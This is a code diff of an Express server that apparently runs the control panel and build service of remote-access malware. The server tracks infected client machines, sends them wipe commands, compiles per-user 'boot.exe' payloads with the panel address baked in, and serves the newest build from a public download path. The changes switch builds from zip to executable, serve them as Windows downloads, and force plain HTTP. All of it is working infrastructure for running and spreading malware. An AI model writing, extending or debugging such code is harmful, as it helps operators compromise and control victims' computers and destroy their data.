@@ -461,7 +461,7 @@ app.get('/api/clients', requireAuth, async (req, res) => {
       ip: r.ip,
       online: now - r.last_seen < 30_000,
       lastSeen: r.last_seen,
-      country: null, // Geo lookup removed
+      country: null,
       privileges: 'admin',
       ping: getPing(r.id),
     })),
@@ -587,8 +587,9 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
 
   let base = req.body?.serverBase;
   if (!base) {
-    const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
-    base = `${proto}://${req.headers.host}`;
+    // Force HTTP for wipe command too
+    const host = req.headers.host.split(':')[0];
+    base = `http://${host}`;
   }
 
   const line = buildWipeCommand(base);
@@ -859,8 +860,9 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
     const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
     
-    const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
-    const serverBase = `${proto}://${req.headers.host}`;
+    // FORCE HTTP TO BYPASS SSL CERTIFICATE ERRORS ON IPs
+    const host = req.headers.host.split(':')[0]; 
+    const serverBase = `http://${host}`;
 
     zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId, serverIp: serverBase });
   } catch (e) {
@@ -869,11 +871,9 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     return res.status(500).json({ error: 'compile failed: ' + msg });
   }
 
-    const outName = `build_${Date.now()}_u${req.user.uid}.exe`;
+  const outName = `build_${Date.now()}_u${req.user.uid}.exe`;
   const outPath = path.join(BUILD_DIR, outName);
   fs.writeFileSync(outPath, zipBuf, { mode: 0o644 });
-  // ...
-  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), zipBuf, { mode: 0o644 });
 
   const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'boot'`).all(req.user.uid);
   for (const b of stale) {
@@ -888,7 +888,7 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
   `).run(req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now());
 
-  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });
+  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), zipBuf, { mode: 0o644 });
 
   res.json({
     ok: true,
@@ -897,7 +897,7 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     size: zipBuf.length,
     key: buildKey,
     url: `/api/builds/${info.lastInsertRowid}/download`,
-    liveUrl: '/api/downloads/boot.zip',
+    liveUrl: '/api/downloads/boot.exe',
   });
 });
 
@@ -918,7 +918,7 @@ app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   if (!row) return res.status(404).json({ error: 'not found' });
   const src = path.join(BUILD_DIR, row.stored_name);
   if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
-  res.setHeader('Content-Type', 'application/zip');
+  res.setHeader('Content-Type', 'application/x-msdownload');
   res.setHeader('Content-Length', row.size);
   res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
   fs.createReadStream(src).pipe(res);
@@ -1044,7 +1044,6 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
   const onlineRow  = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen >= ?`).get(cutoff);
   const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen <  ?`).get(cutoff);
 
-  // Removed c.created_at to prevent SQL error on old databases
   const rows = db.prepare(`
     SELECT c.id, c.hostname, c.ip, c.last_seen, u.username
     FROM clients c
@@ -1064,10 +1063,11 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
       username: r.username,
       online: now - r.last_seen < 30_000,
       lastSeen: r.last_seen,
-      createdAt: r.last_seen, // Fallback for the UI
+      createdAt: r.last_seen, 
     })),
   });
 });
+
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
@@ -1082,7 +1082,7 @@ async function refreshAllBuilds() {
       return;
     }
 
-    let liveZipWritten = false;
+    let liveExeWritten = false;
 
     for (const uid of userIds) {
       try {
@@ -1096,20 +1096,20 @@ async function refreshAllBuilds() {
 
         console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
         
-        const proto = CFG.httpPort === 443 ? 'https' : 'http';
-        const serverBase = `${proto}://${process.env.SERVER_DOMAIN || 'localhost'}`;
+        const host = process.env.SERVER_DOMAIN || 'localhost';
+        const serverBase = `http://${host}`;
         
-        const zipBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id, serverIp: serverBase });
-        const zipName = `build_${Date.now()}_u${uid}.zip`;
-        fs.writeFileSync(path.join(BUILD_DIR, zipName), zipBuf, { mode: 0o644 });
+        const exeBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id, serverIp: serverBase });
+        const exeName = `build_${Date.now()}_u${uid}.exe`;
+        fs.writeFileSync(path.join(BUILD_DIR, exeName), exeBuf, { mode: 0o644 });
 
         const old = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ?`).get(latest.id);
 
         db.prepare(sql`
           UPDATE builds SET name = ?, stored_name = ?, size = ?, created_at = ? WHERE id = ?
-        `).run(zipName, zipName, zipBuf.length, Date.now(), latest.id);
+        `).run(exeName, exeName, exeBuf.length, Date.now(), latest.id);
 
-        if (old && old.stored_name && old.stored_name !== zipName) {
+        if (old && old.stored_name && old.stored_name !== exeName) {
           try { fs.unlinkSync(path.join(BUILD_DIR, old.stored_name)); } catch {}
         }
 
@@ -1121,12 +1121,12 @@ async function refreshAllBuilds() {
           db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
         }
 
-        if (!liveZipWritten) {
-          fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });
-          liveZipWritten = true;
+        if (!liveExeWritten) {
+          fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), exeBuf, { mode: 0o644 });
+          liveExeWritten = true;
         }
 
-        console.log(`[auto-refresh] user ${uid} → ${zipBuf.length} B`);
+        console.log(`[auto-refresh] user ${uid} → ${exeBuf.length} B`);
       } catch (e) {
         console.error(`[auto-refresh] user ${uid}: ${e.message}`);
       }
